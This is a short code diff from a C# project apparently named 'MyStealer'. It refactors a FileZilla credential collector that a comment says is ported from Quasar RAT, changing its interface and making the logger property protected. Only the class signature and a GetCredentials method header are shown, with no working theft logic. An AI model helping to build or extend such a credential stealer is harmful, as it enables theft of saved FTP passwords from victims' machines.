@@ -12,12 +12,12 @@ namespace MyStealer.Collectors.FtpClient
     /// Ported from Quasar RAT
     /// https://github.com/quasar/Quasar/blob/master/Quasar.Client/Recovery/FtpClients/WinScpPassReader.cs
     /// </summary>
-    internal class FileZilla : IMessengerCollector
+    internal class FileZilla : IFtpClientCollector
     {
         public virtual string ApplicationName => "FileZilla";
 
         private ILogger lazyLogger;
-        public ILogger Logger => lazyLogger ?? (lazyLogger = LogExt.ForModule(ApplicationName));
+        protected ILogger Logger => lazyLogger ?? (lazyLogger = LogExt.ForModule(ApplicationName));
 
         public IImmutableSet<CredentialEntry> GetCredentials()
         {
